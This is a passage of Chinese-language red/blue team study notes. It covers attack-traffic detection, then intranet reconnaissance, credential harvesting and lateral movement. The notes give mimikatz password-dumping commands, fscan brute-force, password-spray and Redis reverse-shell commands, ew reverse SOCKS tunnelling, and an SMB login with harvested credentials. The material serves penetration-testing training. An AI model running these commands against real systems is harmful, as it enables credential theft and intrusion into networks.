<h3 id="AWVS特征"><a href="#AWVS特征" class="headerlink" title="AWVS特征"></a>AWVS特征</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413173205425.png" alt="image-20240413173205425"></p>
<h3 id="Appscan、Nessus"><a href="#Appscan、Nessus" class="headerlink" title="Appscan、Nessus"></a>Appscan、Nessus</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413173434808.png" alt="image-20240413173434808"></p>
<h3 id="僵尸网络MOZI"><a href="#僵尸网络MOZI" class="headerlink" title="僵尸网络MOZI"></a>僵尸网络MOZI</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413173537025.png" alt="image-20240413173537025"></p>
</blockquote>
<p>​	主机监控<br>​		通过服务器上安装的agent监控主机行为，以检测木马、外联为主。通过主机监控报警来发现问题</p>
<h2 id="监控方法（怎么做）"><a href="#监控方法（怎么做）" class="headerlink" title="监控方法（怎么做）"></a>监控方法（怎么做）</h2><blockquote>
<h3 id="如何分析是否为工具攻击"><a href="#如何分析是否为工具攻击" class="headerlink" title="如何分析是否为工具攻击"></a>如何分析是否为工具攻击</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413173751576.png" alt="image-20240413173751576"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413173820301.png" alt="image-20240413173820301"></p>
<h3 id="常见的工具特征"><a href="#常见的工具特征" class="headerlink" title="常见的工具特征"></a>常见的工具特征</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413173859831.png" alt="image-20240413173859831"></p>
<h3 id="漏洞工具识别"><a href="#漏洞工具识别" class="headerlink" title="漏洞工具识别"></a>漏洞工具识别</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413173942769.png" alt="image-20240413173942769"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413174028021.png" alt="image-20240413174028021"></p>
<h3 id="重点注意木马"><a href="#重点注意木马" class="headerlink" title="重点注意木马"></a>重点注意木马</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413174326201.png" alt="image-20240413174326201"></p>
</blockquote>
<h2 id="分析思路（为什么）"><a href="#分析思路（为什么）" class="headerlink" title="分析思路（为什么）"></a>分析思路（为什么）</h2><p>​	分析的方法论</p>
<p>​		访问时间、IP、频率	</p>
<p>​			非业务时段、单IP大量请求、不同IP间请求存在关联的恶意内容嫌疑等情况都是可疑的</p>
<p>​		访问业务路径、响应内容</p>
<p>​			不常见的访问路径、不符合业务正常响应的内容等情况是可疑的</p>
<p>​		访问请求特征、参数</p>
<p>​			具有明显的攻击特征的参数可确认为攻击者</p>
<blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413182229218.png" alt="image-20240413182229218"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240413182650579.png" alt="image-20240413182650579"></p>
</blockquote>
<h1 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="入口点信息收集"><a href="#入口点信息收集" class="headerlink" title="入口点信息收集"></a>入口点信息收集</h3><h4 id="查看网络配置"><a href="#查看网络配置" class="headerlink" title="查看网络配置"></a>查看网络配置</h4><p><code>ipconfig /all</code></p>
<h4 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h4><p><code>netstat -an</code>	查看网络连接，通常可以通过这条命令判断，管理员网段，数据库服务器，在刚进入内网时间、判断下一步横向扩展的方向</p>
<h4 id="查看登录日志"><a href="#查看登录日志" class="headerlink" title="查看登录日志"></a>查看登录日志</h4><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><p><code>last -n 10</code>	查看最近十条登录日志</p>
<h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><p><code>PowerShell &quot;Get-EventLog -LogName security -Newest 500 | where &#123;$ .EventID -eq 4624&#125; | format-list -property * | findstr &quot;Address&quot;&quot;</code>	管理员从哪条机器过来的</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414152948705.png" alt="image-20240414152948705" style="zoom: 50%;" />

<h4 id="杀毒软件信息收集"><a href="#杀毒软件信息收集" class="headerlink" title="杀毒软件信息收集"></a>杀毒软件信息收集</h4><p>​	所有渗透测试都需要保证在没有杀毒软件或者确保杀毒软件不会对你的行为有影响的前提下进行，所以我们通常需要在渗透测试的前期掌握杀入软件信息</p>
<h5 id="Windows查看杀毒软件的方法"><a href="#Windows查看杀毒软件的方法" class="headerlink" title="Windows查看杀毒软件的方法"></a>Windows查看杀毒软件的方法</h5><p><code>net start</code>	从服务中查看是否存在杀毒软件的服务</p>
<p><code>Tasklist /svc</code>	从进程中查看是否存在杀软的进程，这个需要熟知常见的杀毒软件的进程名，如果不知道，可以放到识别网站，进行识别</p>
<h4 id="收集密码信息"><a href="#收集密码信息" class="headerlink" title="收集密码信息"></a>收集密码信息</h4><p>​	包括数据库账号密码，本地管理员账号密码，内存中保存的用户密码，ssh目录下面查看是否存ssh私钥</p>
<h5 id="利用mimikatz获取用户密码"><a href="#利用mimikatz获取用户密码" class="headerlink" title="利用mimikatz获取用户密码"></a>利用mimikatz获取用户密码</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取内存中的密码</span></span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取本地用户的密码</span></span><br><span class="line">reg save hklm\sam c:\sam</span><br><span class="line">reg save hklm\system c:\system</span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;lsadump::sam /sam:sam /system:system&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="利用收集到的密码hash-检测同网段是否有相同密码的主机"><a href="#利用收集到的密码hash-检测同网段是否有相同密码的主机" class="headerlink" title="利用收集到的密码hash 检测同网段是否有相同密码的主机"></a>利用收集到的密码hash 检测同网段是否有相同密码的主机</h5><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414154816251.png" alt="image-20240414154816251" style="zoom:50%;" />

<h3 id="利用nbtscan对135端口做域探测"><a href="#利用nbtscan对135端口做域探测" class="headerlink" title="利用nbtscan对135端口做域探测"></a>利用nbtscan对135端口做域探测</h3><p><a target="_blank" rel="noopener" href="https://github.com/lifenjoiner/nbtscan">nbtscan</a></p>
<p><code>nbtscan 10.1.1.1/24</code>	这个工具可以快速的找到带有域主机，可以找到下一步渗透的方向，毕竟域才最能是获取更多权限的</p>
<p>​	BTscan 是一个用户扫描IP网络以获取NetBIOS名称程序信息。他向每个地址发送NetBIOS状态查询提供的范围和列表接收到的人类信息可读形式。对于每个响应的主机。它都会列出IP地址，NetBIOS计算机名称、登录用户名和MAC地址</p>
<h3 id="对收集到的网段进行端口漏洞扫描"><a href="#对收集到的网段进行端口漏洞扫描" class="headerlink" title="对收集到的网段进行端口漏洞扫描"></a>对收集到的网段进行端口漏洞扫描</h3><p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">fscan</a></p>
<p>​	一款<strong>内网综合扫描工具</strong>（流量大、特征明显），方便一键自动化、全方位漏洞扫描</p>
<p>​	支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-np</span> <span class="literal">-no</span> <span class="literal">-nopoc</span>	(跳过存活检测、不保存文件、跳过web poc扫描)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-rf</span> id_rsa.pub	(redis写公钥)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-rs</span> <span class="number">192.168</span>.<span class="number">1.1</span>:<span class="number">6666</span>	(redis 计划任务反弹shell)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-c</span> whoami	(ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-m</span> ssh <span class="literal">-p</span> <span class="number">2222</span>	(指定模块ssh和端口)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-pwdf</span> pwd.txt <span class="literal">-userf</span> users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-o</span> /tmp/<span class="number">1</span>.txt	(指定扫描结果保存路径，默认保存在当前路径)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">8</span>	(A段的<span class="number">192</span>.x.x.<span class="number">1</span>和<span class="number">192</span>.x.x.<span class="number">254</span>，方便快速查看网段信息)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-m</span> smb <span class="literal">-pwd</span> password	(smb密码碰撞)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-m</span> ms17010	(指定模块)</span><br><span class="line">fscan.exe <span class="literal">-hf</span> ip.txt	(以文件导入)</span><br><span class="line">fscan.exe <span class="literal">-u</span> http://baidu.com <span class="literal">-proxy</span> <span class="number">8080</span>	(扫描单个url，并设置http代理 http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-nobr</span> <span class="literal">-nopoc</span>	(不进行爆破，不扫Web poc，以减少流量)</span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-pa</span> <span class="number">3389</span>	(在原基础上，加上<span class="number">3389</span>-&gt;rdp扫描)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码碰撞使用方法</span></span><br><span class="line">fscan <span class="literal">-t</span> <span class="number">100</span> <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-m</span> smb <span class="literal">-pwd</span> password</span><br><span class="line">fscan <span class="literal">-t</span> <span class="number">100</span> <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-m</span> sssh <span class="literal">-pwd</span> password</span><br><span class="line">fscan <span class="literal">-t</span> <span class="number">100</span> <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-m</span> mssql <span class="literal">-pwd</span> password</span><br></pre></td></tr></table></figure>

<h2 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h2><p>​	正向代理中，Proxy和Client同属一个区域，对Server是透明的</p>
<p>​	反向代理中，Proxy和Server同属一个区域，对Client透明</p>
<p>​	共同特点：代替收发请求和响应</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414162407770.png" alt="image-20240414162407770" style="zoom: 80%;" />

<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">reGeorg</a></p>
<p>​	使用情况：在目标不出网，并且有Web环境的时候，使用工具上传一个脚本工具，正向连接过去</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414162657351.png" alt="image-20240414162657351" style="zoom:80%;" />

<h4 id="socks协议"><a href="#socks协议" class="headerlink" title="socks协议"></a>socks协议</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414163020908.png" alt="image-20240414163020908" style="zoom:80%;" />

<h4 id="常见的转发工具及不同平台的代理链工具"><a href="#常见的转发工具及不同平台的代理链工具" class="headerlink" title="常见的转发工具及不同平台的代理链工具"></a>常见的转发工具及不同平台的代理链工具</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414163132179.png" alt="image-20240414163132179" style="zoom:80%;" />

<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p><a target="_blank" rel="noopener" href="https://github.com/idlefire/ew?tab=readme-ov-file">ew</a></p>
<p>​	目标网络边界不存在公网IP，需要通过反弹方式创建socks代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">【使用场景】</span><br><span class="line"></span><br><span class="line">    普通网络环境：</span><br><span class="line">        1.  目标网络边界存在公网IP且可任意开监听端口：</span><br><span class="line"></span><br><span class="line">                  +---------+     +-------------------+  </span><br><span class="line">                  |HackTools| -&gt;&gt; | 8888-&gt;  1.1.1.1   |</span><br><span class="line">                  +---------+     +-------------------+</span><br><span class="line"></span><br><span class="line">                a)./ew -s ssocksd -l 8888</span><br><span class="line">                        // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理</span><br><span class="line">                b) HackTools 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理</span><br><span class="line">                    </span><br><span class="line">        2.  目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理</span><br><span class="line">            </span><br><span class="line">                                        一台可控公网IP主机                  可控内网主机</span><br><span class="line">                  +---------+     +--------------------------+    |     +---------------+</span><br><span class="line">                  |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2  |</span><br><span class="line">                  +---------+     +--------------------------+    |     +---------------+</span><br><span class="line"></span><br><span class="line">                a) ./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line">                            // 在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机</span><br><span class="line">                b) ./ew -s rssocks -d 1.1.1.1 -e 8888          </span><br><span class="line">                            // 将目标网络的可控边界主机反向连接公网主机</span><br><span class="line"></span><br><span class="line">                c) HackTools 可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务</span><br></pre></td></tr></table></figure>

<h2 id="横向扩点"><a href="#横向扩点" class="headerlink" title="横向扩点"></a>横向扩点</h2><h3 id="Windows认证分类"><a href="#Windows认证分类" class="headerlink" title="Windows认证分类"></a>Windows认证分类</h3><p>本地认证、工作组远程认证、域环境kerberos认证</p>
<h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414165226155.png" alt="image-20240414165226155" style="zoom:80%;" />

<h4 id="远程主机进行NTLM认证"><a href="#远程主机进行NTLM认证" class="headerlink" title="远程主机进行NTLM认证"></a>远程主机进行NTLM认证</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414165337552.png" alt="image-20240414165337552" style="zoom:80%;" />

<h4 id="认证详细流程"><a href="#认证详细流程" class="headerlink" title="认证详细流程"></a>认证详细流程</h4><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414165542861.png" alt="image-20240414165542861" style="zoom:80%;" />

<h3 id="横向移动攻击"><a href="#横向移动攻击" class="headerlink" title="横向移动攻击"></a>横向移动攻击</h3><ol>
<li>横向移动攻击的目的</li>
</ol>
<p>	</p>
<ul>
<li>横向移动攻击通常发生在攻击者获取基本的“立足点”之后，为了能够获取更加有价值的资产目标，而进行横向移动</li>
</ul>
<ol start="2">
<li>横向移动攻击发生的前提条件</li>
</ol>
<ul>
<li>先前准备为资产发现与凭证窃取（即内网信息收集）</li>
</ul>
<ol start="3">
<li><p>如何进行横向移动攻击</p>
</li>
<li><p>如何防御与检测横向移动攻击</p>
</li>
</ol>
<h3 id="如何进行横向移动攻击"><a href="#如何进行横向移动攻击" class="headerlink" title="如何进行横向移动攻击"></a>如何进行横向移动攻击</h3><p>​	本地提到的横向移动攻击我们粗略分为三类</p>
<ol>
<li>无凭证</li>
<li>有凭证 </li>
<li>文件下载</li>
</ol>
<p>注：</p>
<ul>
<li><p>本次分析重点为有凭证情况，默认已知受害机凭证</p>
</li>
<li><p>无凭证情况为漏洞利用，通常有较明显行为特征</p>
</li>
<li><p>ATT&amp;Ck将文件下载也作为横向移动攻击部分</p>
</li>
</ul>
<h4 id="无凭证情况"><a href="#无凭证情况" class="headerlink" title="无凭证情况"></a>无凭证情况</h4><p>若无目标系统凭证、即需要利用漏洞进行攻击，该类攻击通常有较为明显的行为特征</p>
<p>常用漏洞例如：</p>
<ul>
<li>redis未授权</li>
<li>MS17-010</li>
<li>CVE-2020-1472</li>
<li>CVE-2019-0708</li>
<li>CVE-2017-0144</li>
<li>各类应用程序与协议漏洞</li>
</ul>
<p><em><strong>下面为无凭证情况下可以基于当前信息尝试的攻击举例</strong></em></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414171132706.png" alt="image-20240414171132706" style="zoom:80%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414171244069.png" alt="image-20240414171244069" style="zoom:80%;" />

<h4 id="有凭证情况"><a href="#有凭证情况" class="headerlink" title="有凭证情况"></a>有凭证情况</h4><p>​	在拥有凭证的情况下，我们可以使自己的行为与常规运维有较高的“相似性”。下面会先说明协议的常规实现，再进协议利用，最后进行协议检测。再次说明，默认已经获取目标系统登录凭证。</p>
<ul>
<li>RDP协议</li>
<li>SMB协议</li>
<li>SSH协议</li>
<li>WrinRM</li>
<li>Pass The Hash</li>
<li>Pass The Ticket</li>
</ul>
<h5 id="RDP-协议"><a href="#RDP-协议" class="headerlink" title="RDP 协议"></a>RDP 协议</h5><h6 id="RDP-常规连接"><a href="#RDP-常规连接" class="headerlink" title="RDP 常规连接"></a>RDP 常规连接</h6><p>一定要在确保管理员不在线的情况下登录，否则会把他挤下线。</p>
<p>通过图形化的方式进行连接。</p>
<p>流量数据进行了RC4加密。</p>
<p>注：当前认为RC4协议是不安全的，通过哈希碰撞可能得到解密内容，也可以直接通过windows秘钥解密。</p>
<p>常规连接行为特点：</p>
<ul>
<li>具有图形化界面</li>
<li>连接时长较长 ，进行复杂操作</li>
<li>连接目标相对固定</li>
</ul>
<h6 id="通过-Linux-系统创建-RDP-连接"><a href="#通过-Linux-系统创建-RDP-连接" class="headerlink" title="通过 Linux 系统创建 RDP 连接"></a>通过 Linux 系统创建 RDP 连接</h6><p><strong>工具：rdesktop</strong></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414172401027.png" alt="image-20240414172401027" style="zoom:80%;" />

<h6 id="通过-rdp文件创建连接"><a href="#通过-rdp文件创建连接" class="headerlink" title="通过.rdp文件创建连接"></a>通过.rdp文件创建连接</h6><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414172510186.png" alt="image-20240414172510186" style="zoom:80%;" />

<h5 id="SMB-协议-CIFS-协议"><a href="#SMB-协议-CIFS-协议" class="headerlink" title="SMB 协议&#x2F;CIFS 协议"></a>SMB 协议&#x2F;CIFS 协议</h5><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414172811869.png" alt="image-20240414172811869" style="zoom:80%;" />

<h6 id="为什么使用smb"><a href="#为什么使用smb" class="headerlink" title="为什么使用smb"></a>为什么使用smb</h6><ul>
<li>默认开放</li>
<li>默认允许出入站（防火墙不阻拦）</li>
<li>不需要高权限</li>
<li>可以实现信息回传</li>
<li>已知用户名密码如何使用smb协议建立连接</li>
</ul>
<p><code>net use \\10.x.x.10\ipc$ Password /u:system\administrator</code></p>
<h5 id="SSH-协议"><a href="#SSH-协议" class="headerlink" title="SSH 协议"></a>SSH 协议</h5><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414173214598.png" alt="image-20240414173214598" style="zoom:80%;" />

<h5 id="WinRM（Windows-Remote-Managerment）"><a href="#WinRM（Windows-Remote-Managerment）" class="headerlink" title="WinRM（Windows Remote Managerment）"></a>WinRM（Windows Remote Managerment）</h5><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="./%E6%8A%A4%E7%BD%91%E8%93%9D%E9%98%9F%E3%80%81%E7%BA%A2%E9%98%9F.assets/image-20240414173309187.png" alt="image-20240414173309187" style="zoom:80%;" />

